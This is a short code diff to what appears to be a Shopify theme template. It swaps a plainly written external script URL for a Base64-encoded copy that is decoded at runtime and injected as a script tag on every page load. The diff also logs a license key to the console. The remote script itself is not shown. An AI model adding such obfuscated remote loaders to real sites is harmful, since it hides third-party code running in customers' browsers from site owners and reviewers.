@@ -34,9 +34,16 @@
           var licenseKey = "{{ settings.licens_key }}"; // Shopify設定からライセンスキーを取得
           console.log(licenseKey);
 
+          // エンコードされたURL（Base64）
+          var encodedUrl = "aHR0cHM6Ly9naC1jaGVjay5jb20vbGljZW5zZS10ZXN0L2pzL2xpY2Vuc2Utd2FybmluZy5qcw==";
+          
+          // Base64をデコードして元のURLに戻す
+          var decodedUrl = atob(encodedUrl);
+          console.log("Decoded URL:", decodedUrl);  // デコードされたURLを確認する
+
           // 外部スクリプトを動的に読み込む
           var script = document.createElement('script');
-          script.src = "https://gh-check.com/license-test/js/license-warning.js"; // 外部スクリプトURL
+          script.src = decodedUrl;  // デコードしたURLを使用
           script.async = true;
           document.head.appendChild(script);
 
